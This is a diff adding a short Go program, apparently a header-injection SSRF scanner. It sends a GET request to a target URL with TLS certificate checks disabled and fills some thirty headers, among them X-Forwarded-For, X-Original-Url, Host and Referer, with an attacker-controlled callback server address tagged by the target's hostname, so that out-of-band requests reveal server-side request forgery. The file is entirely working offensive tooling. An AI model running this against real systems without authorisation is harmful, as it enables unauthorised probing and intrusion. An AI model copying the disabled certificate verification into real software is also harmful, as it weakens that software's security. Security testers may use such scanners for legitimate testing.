@@ -1,0 +1,99 @@
+package main
+
+import (
+    "fmt"
+    "os"
+    "net/url"
+    "net/http"
+    "log"
+    "net/http/httputil"
+//    "io/ioutil"
+    "strings"
+//    "bufio"
+    "crypto/tls"
+)
+
+
+func ssrf(url1,server,cookie1 string) {
+
+         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+         client := &http.Client{}
+         req, err := http.NewRequest("GET",url1, nil)
+         req.Header.Add("Proxy-Host", server+"_Proxy-Host.txt")
+         req.Header.Add("Request-Uri", server+"_Request-Uri.txt")
+         req.Header.Add("X-Forwarded", server+"_X-Forwarded.txt")
+         req.Header.Add("X-Forwarded-By", server+"_X-Forwarded-By.txt")
+         req.Header.Add("X-Forwarded-For", server)
+         req.Header.Add("X-Forwarded-For-Original", server)
+         req.Header.Add("X-Forwarded-Host", server)
+         req.Header.Add("X-Forwarded-Server", server)
+         req.Header.Add("X-Forwarder-For", server)
+         req.Header.Add("X-Forward-For", server)
+         req.Header.Add("Base-Url", server)
+         req.Header.Add("Http-Url", server)
+         req.Header.Add("Proxy-Url", server)
+         req.Header.Add("Redirect", server)
+         req.Header.Add("Real-Ip", server)
+         req.Header.Add("Referer", server)
+         req.Header.Add("Referrer", server)
+         req.Header.Add("Refferer", server)
+         req.Header.Add("Uri", server)
+         req.Header.Add("Url", server)
+         req.Header.Add("X-Host", server)
+         req.Header.Add("X-Http-Destinationurl", server)
+         req.Header.Add("X-Http-Host-Override", server)
+         req.Header.Add("X-Original-Remote-Addr", server)
+         req.Header.Add("X-Original-Url", server)
+         req.Header.Add("X-Proxy-Url", server)
+         req.Header.Add("X-Rewrite-Url", server)
+         req.Header.Add("X-Real-Ip", server)
+         req.Header.Add("X-Remote-Addr", server)
+         req.Header.Add("Host", server)
+         req.Header.Add("Cookie", cookie1)
+
+         res,err := client.Do(req)
+
+         if err != nil{
+            log.Fatal(err)
+         }
+
+         requestDump, err := httputil.DumpRequest(req, true)
+         if err != nil {
+              fmt.Println(err)
+         }
+         fmt.Println(string(requestDump))
+         fmt.Println(url1,res.StatusCode)
+//         reqBody, err := ioutil.ReadAll(res.Body)
+//         if err != nil {
+//                          log.Fatal(err)
+//         }
+//         fmt.Printf("%s", reqBody)
+}
+
+func main() {
+//              file, err := os.Open(os.Args[1])
+//              if err != nil {
+//                 log.Fatal(err)
+//              }
+//              defer file.Close()
+//              scanner := bufio.NewScanner(file)
+//              for scanner.Scan() {
+//                 str := scanner.Text()
+
+                 str:=os.Args[1]
+                 server_test := os.Args[2]
+                 u, err := url.Parse(str)
+                 if err != nil {
+                      panic(err)
+                 }
+                 res1 := strings.Replace(u.Host, ".", "_",-1)
+                 server1:=server_test+"/"+res1 
+                 cookie:=os.Args[3]
+                 if cookie == "1" {
+                    ssrf(str,server1,server1)
+                 }else{
+                    ssrf(str,server1,os.Args[3])
+                }
+
+
+}
